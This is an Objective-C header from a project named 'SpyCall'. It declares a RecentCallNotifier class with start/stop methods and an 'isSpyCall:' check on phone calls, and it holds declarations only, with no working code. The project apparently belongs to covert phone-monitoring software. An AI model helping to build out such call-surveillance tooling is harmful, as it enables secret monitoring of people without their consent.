//
//  RecentCallNotifier.h
//  SpyCall
//
//  Created by Makara Khloth on 3/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "Telephony.h"


@protocol PreferenceManager;


@interface RecentCallNotifier : NSObject {
@private
	NSThread	*mRecentCallNotificationThread;
	NSRunLoop	*mRecentCallNotificationRL;
	
	id <PreferenceManager>	mPreferenceManager; // Not own
	BOOL		mIsListening;
}

@property (assign) id <PreferenceManager> mPreferenceManager;
@property (assign) BOOL mIsListening;

- (id) init;

- (void) start;
- (void) stop;

- (BOOL) isSpyCall: (CTCall *) aCall;

@end
